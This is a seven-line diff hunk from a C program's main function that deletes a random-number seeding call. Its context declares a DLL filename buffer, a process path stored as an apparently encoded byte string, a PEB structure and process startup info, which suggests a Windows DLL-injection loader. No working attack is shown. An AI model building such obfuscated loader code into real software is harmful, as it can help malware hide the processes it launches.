@@ -52,7 +52,6 @@ int main(int argc, char* argv[], char* envp[])
 {
 	char dll_filename[64];
 	char process_path[] = "\xCC\xB5\xD3\xD8\xE6\xE1\xEB\xE0\xF8\xFC\xD3\xEA\xF7\xFF\xE3\xE0\xFD\xEA\xFD\xA1\xEA\xF7\xEA";
-	srand(time(NULL));
 	PEB peb;
 	STARTUPINFOA startinfo;
 	memset(&startinfo, 0, sizeof(startinfo));
